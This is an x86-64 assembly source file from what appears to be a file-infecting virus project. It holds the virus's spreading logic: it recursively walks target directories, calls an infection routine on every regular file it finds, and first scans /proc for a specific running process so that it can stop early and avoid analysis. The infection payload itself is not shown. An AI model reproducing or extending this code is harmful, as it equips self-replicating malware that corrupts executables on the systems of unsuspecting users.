%include "constants.inc"
%include "data.inc"

section .text

extern _move_through_dir
extern _exit

global _search_dir
global _move_through_dir

_search_dir:
	; check for process running
	push 1
	pop rsi ; mode for move_through_dir
	lea rdi, [rel process_dir]

	call _move_through_dir

	cmp rax, 0x0
	jne .return
	xor rsi, rsi ; mode for move_through_dir
	lea rdi, [rel directories]
	xor rcx, rcx; = 0
	.loop_array_string:
		add rdi, rcx
		call _ft_strlen
		push rax
		pop rcx
		call _move_through_dir
	inc rcx
	cmp byte[rdi + rcx], 0x0
	jnz .loop_array_string
	.return:
ret

_move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
	push r10
	push r12
	push r13
	push rbx
	push rcx
	push rdx

	push rsi
	pop r13

	push SYSCALL_OPEN
	pop rax; open
	push 0o0200000; O_RDONLY | O_DIRECTORY
	pop rsi
	syscall
	cmp rax, 0x0
	jl .return; jump lower

	push rdi
	pop r10; path

	sub rsp, 1024
	push rax
	.getdents:
		pop rdi
		push SYSCALL_GETDENTS
		pop rax; getdents
		push 1024
		pop rdx; size of buffer
		mov rsi, rsp; buffer
		syscall
		push rdi
		push rsi
		pop r12
		cmp rax, 0x0
		jle .close
		push rax
		pop rdx; nread
		xor rcx, rcx; = 0

	.loop_in_file:
		cmp rcx, rdx
		jge .getdents; rcx >= rdx
		mov rdi, r12
		add rdi, rcx; r12 => linux_dir
		; if not . .. +18
		add rdi, 18; linux_dir->d_name
		
		; ft_strcmp with '.' and '..' to not infect_dir with them
		push rcx
		lea rsi, [rel dotdir]
		xor rcx, rcx; = 0
		.loop_array_string:
			add rsi, rcx
			call _ft_strcmp
			cmp rax, 0x0
			je .next_file
			xor rcx, rcx; = 0
			.next_string:; seek next dir
				inc rcx
				cmp byte[rsi + rcx], 0x0
				jnz .next_string
		inc rcx
		cmp byte[rsi + rcx], 0x0
		jnz .loop_array_string

		; concat_path
			push rbx
			sub rsp, 4096

			push rdi
			pop rbx
			mov rdi, rsp; buffer
			mov rsi, r10
			call _ft_strcpy
			push rbx
			pop rsi
			call _ft_concat_path

		; check infect_dir or infect_file
			sub rsp, 600

			push SYSCALL_LSTAT
			pop rax ; stat
			mov rsi, rsp ; struct stat
			syscall
			cmp rax, 0x0
			jne .free_buffers

			mov rax, [rsi + ST_MODE]
			and rax, S_IFMT

			cmp r13, 0; infect
			je .infect

			; process
			cmp rax, S_IFDIR
			jne .free_buffers

			; if /proc/[nb] -> check /proc/[nb]/status
			push rdi
			push rbx
			pop rdi
			call _ft_isnum
			pop rdi
			cmp rax, 0x0
			je .free_buffers
			lea rsi, [rel process_status]
			call _ft_concat_path
			call _check_file_process
			cmp rax, 0x0
			jne .process_found

			jmp .free_buffers
			.infect:
				cmp rax, S_IFREG ; S_IFREG
				je .infect_file
				cmp rax, S_IFDIR ; S_IFDIR
				jne .free_buffers

			; infect dir
			xor rsi, rsi; infect -> 0
			call _move_through_dir
			jmp .free_buffers

		.infect_file:
			call _infect_file

		.free_buffers:
			add rsp, 4696
			pop rbx

		.next_file:
			pop rcx
			mov rsi, r12
			add rsi, rcx
			push rdi
			movzx edi, word [rsi + D_RECLEN]; linux_dir->d_reclen
			add rcx, rdi
			pop rdi
			jmp .loop_in_file

	.process_found:
		add rsp, 4696
		pop rbx
		pop rcx

	.close:
		push rax
		pop rsi
		pop rdi; fd
		push SYSCALL_CLOSE
		pop rax; close
		syscall
		push r10
		pop rdi
		add rsp, 1024
		push rsi
		pop rax

	.return:

	pop rdx
	pop rcx
	pop rbx
	pop r13
	pop r12
	pop r10
ret